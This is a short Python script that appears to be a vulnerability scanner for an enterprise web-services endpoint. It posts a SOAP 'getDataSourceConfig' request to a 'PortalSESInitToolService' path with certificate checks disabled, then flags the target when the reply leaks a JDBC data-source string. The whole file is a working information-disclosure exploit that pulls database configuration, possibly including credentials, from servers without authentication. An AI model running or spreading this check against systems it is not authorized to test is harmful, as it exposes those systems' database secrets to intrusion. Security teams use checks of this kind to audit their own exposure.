import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	url=baseurl+"uapws/service/nc.itf.ses.inittool.PortalSESInitToolService"
	body='''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
 <soapenv:Header/>
 <soapenv:Body>
    <por:getDataSourceConfig/>
 </soapenv:Body>
</soapenv:Envelope>'''
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "text/xml" in response.headers["Content-Type"] and response.text.startswith("<soap:Envelope") and re.search("<return>jdbc:.*?</return>",response.text):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
